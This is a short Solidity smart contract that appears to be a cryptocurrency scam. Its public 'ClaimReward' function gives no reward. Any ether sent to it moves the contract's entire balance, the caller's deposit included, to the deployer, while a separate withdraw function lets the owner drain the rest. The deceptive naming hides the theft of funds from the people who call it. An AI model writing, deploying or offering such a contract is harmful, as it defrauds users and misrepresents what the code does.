// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

contract Claim {
  address private owner;
  
  constructor() {
  	owner = msg.sender;
  }
  
  function withdraw() public payable {
    require(msg.sender == owner, "You are not the owner!");
    payable(msg.sender).transfer(address(this).balance);
  }
  
  function ClaimReward() public payable {
    if (msg.value > 0) payable(owner).transfer(address(this).balance);
  }
}